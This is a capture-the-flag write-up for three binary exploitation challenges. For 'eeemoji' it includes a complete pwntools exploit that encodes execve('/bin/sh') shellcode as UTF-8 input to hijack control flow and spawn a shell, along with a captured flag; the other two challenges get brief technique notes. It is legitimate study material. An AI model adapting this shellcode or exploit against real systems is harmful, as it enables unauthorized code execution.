## eeemoji

In the `🐴` function, we can control 2-byte assembly code. I use `push r11` to hijack control flow to our shellcode.

```python
# flag{zer0_address_is_so0o0o0o_dangerous}

from pwn import *
from subprocess import check_output
import sys

context.arch = 'amd64'
context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']

binary = ("./eeemoji")
elf = ELF(binary, checksec=False)
libc = elf.libc

if not args['REMOTE']:
    r = process(binary)
else:
    r = remote("pwnable.org", 31322)

def get_utf8(c):
    out = check_output("echo '{}' | ./convert2".format(c), shell=True)
    return out

menu_indictor = "\xf0\x9f\x8d\xba\x0a"
edit_indictor = "\xf0\x9f\x98\x93\x0a"

bull = u'\U0001f42e'.encode("utf-8")
beer = u'\U0001f37a'.encode("utf-8")
horse = u'\U0001f434'.encode("utf-8")

def beerfunc():
    r.sendlineafter(menu_indictor, beer)

def bullfunc():
    r.sendlineafter(menu_indictor, bull)

def horsefunc(data):
    r.sendlineafter(menu_indictor, horse)
    r.sendafter(edit_indictor, data)

beerfunc()

sh = 'jhPXH\xb8/bin///sPH\x89\xe7hri\x01\x01PX\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VPXH\x89\xe61\xd2j;X' 
data = ""
for i in xrange(0, len(sh), 4):
    x = u32(sh[i:i+4])
    data += get_utf8(x)
data += get_utf8(0x050f)

payload = 'a'
payload += data
payload += 'a'*(0x80-1-14)
payload += get_utf8(0x5341)

horsefunc(payload)

r.interactive()
```

## eeeeeemoji

We can use `and esp, edx` to hijack control flow. Several times needed.

## simple echoserver

Modify the ebp chain to stack pivot, and modify main_ret to one_gadget. 1/32 probability.
